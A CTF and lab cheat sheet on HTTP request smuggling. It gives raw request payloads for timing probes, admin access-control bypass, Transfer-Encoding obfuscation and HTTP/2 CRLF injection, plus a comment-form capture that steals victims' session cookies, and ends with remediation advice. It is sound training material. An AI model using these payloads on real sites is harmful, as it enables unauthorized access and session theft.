# HTTP Request Smuggling — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, HTTP Request Smuggler BApp, Repeater  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

HTTP Request Smuggling occurs when front-end reverse proxies and backend servers disagree on request boundaries (`Content-Length` vs `Transfer-Encoding: chunked`).

1. **Detect Discrepancy:**
   - **CL.TE:** Front-end uses `Content-Length`, Back-end uses `Transfer-Encoding`.
   - **TE.CL:** Front-end uses `Transfer-Encoding`, Back-end uses `Content-Length`.
   - **TE.TE:** Both support `Transfer-Encoding`, but one can be tricked by obfuscated headers (`Transfer-encoding: cow`).
2. **Confirm with Timing Delays:** Submit a request designed to cause one server to hang waiting for remaining bytes.
3. **Confirm with Differential Responses:** Smuggle a partial request prefix (`GET /404 HTTP/1.1`) so the *subsequent* request receives a 404.
4. **Weaponize:**
   - Bypass front-end access controls (`/admin`).
   - Reveal front-end header rewriting (`X-Custom-IP-Authorization`).
   - Steal victim credentials/cookies (poisoning comment posts).
   - Poison web caches or chain with XSS.

> **CRITICAL REPEATER SETTINGS:** In Burp Repeater, disable **"Update Content-Length automatically"** in the gear settings menu. Send raw HTTP/1.1 requests.

---

## 2. Detection Payloads & Timing Probes

### CL.TE Detection Probe (Causes Backend Timeout)
If backend uses `Transfer-Encoding`, it waits for the next chunk size:

```http
POST / HTTP/1.1
Host: TARGET.net
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```
- **If CL.TE:** Response delays significantly (10+ seconds timeout) because backend expects more chunks.

---

### TE.CL Detection Probe (Causes Backend Timeout)
If backend uses `Content-Length`, it reads 6 bytes and waits for the remaining body:

```http
POST / HTTP/1.1
Host: TARGET.net
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
- **If TE.CL:** Response delays significantly (10+ seconds timeout).

---

## 3. Confirming & Exploiting CL.TE

The front-end routes based on `Content-Length`. The backend parses `Transfer-Encoding` and stops processing at `0\r\n\r\n`, leaving the remaining bytes appended to the start of the next request in the connection pipeline.

### Exploit: Bypassing Front-End Access Controls (`/admin`)

```http
POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
*Note: Send this request twice. The second request receives the response for the smuggled `/admin` request.*

---

## 4. Confirming & Exploiting TE.CL

The front-end parses `Transfer-Encoding: chunked`. The backend parses `Content-Length: 4` (reading only the chunk size) and treats the rest of the body as the start of the next request.

### Exploit: Bypassing Front-End Controls

```http
POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
*(Ensure the chunk length hex `5e` matches the exact byte count of the smuggled payload down to the terminating `0`).*

---

## 5. TE.TE: Obfuscating `Transfer-Encoding`

When both servers support `Transfer-Encoding`, find an obfuscation accepted by one server but ignored by the other (falling back to `Content-Length`):

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding:
 chunked

Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
```

---

## 6. Advanced CTF Exploitation Chains

### 1. Revealing Front-End Request Rewriting
Proxies often attach internal headers (e.g., `X-Forwarded-For`, `X-Client-IP`, `X-SSL-Client-Cert`).
Smuggle a request into a search/reflection parameter to view the appended proxy headers:

```http
POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=test
```
*Next request will have its proxy headers appended to `search=test` and printed in the search results page.*

---

### 2. Capturing Victim Requests (Credential Theft)
Smuggle a partial POST request into a storage feature (e.g. a blog comment form):

```http
POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 260
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 600
Cookie: session=ATTACKER_SESSION

name=test&email=test@test.com&postId=1&comment=
```
*When a victim makes a request, their entire request (including session cookies and authorization tokens) is appended to `comment=` and stored in the database for the attacker to read.*

---

## 7. HTTP/2 Request Smuggling (H2.CL / H2.TE)

Front-end speaks HTTP/2, but downgrades to HTTP/1.1 when speaking to backend servers.

### 1. H2.CL Exploitation
In Burp Repeater (set protocol to HTTP/2):
- Set a manual `content-length` header inside HTTP/2 headers table.
- Since H2 frames natively carry length, the front-end uses framing, but backend parses the smuggled HTTP/1.1 `Content-Length`.

### 2. H2 CRLF Injection
HTTP/2 allows injecting `\r\n` characters inside header names or values that front-ends fail to sanitize before downgrading to HTTP/1.1:
- Name: `foo`
- Value: `bar\r\nTransfer-Encoding: chunked`

---

## 8. CTF Quick Reference

| Variant | Front-End Parses | Back-End Parses | Detection Probe Behavior |
|---|---|---|---|
| **CL.TE** | `Content-Length` | `Transfer-Encoding` | Timeout when body ends before final chunk `0` |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` | Timeout when CL is shorter than chunk payload |
| **TE.TE** | Disagrees on obfuscated header | Fallback to CL | Discrepancy via obfuscated header variations |
| **H2.CL** | H2 Frames | Downgraded `Content-Length` | Smuggle prefix via injected `content-length` header |
| **H2.TE** | H2 Frames | Downgraded `Transfer-Encoding` | Smuggle prefix via injected TE header or CRLF |

---

## 9. Remediation

- **Use HTTP/2 end-to-end:** Disable HTTP/2 downgrading to backend services.
- **Normalize HTTP/1.1 headers:** Ensure front-end and backend use the exact same HTTP server software or reverse-proxy parser implementation.
- **Disallow Ambiguity:** Reject requests containing both `Content-Length` and `Transfer-Encoding` headers (RFC 7230 compliance).
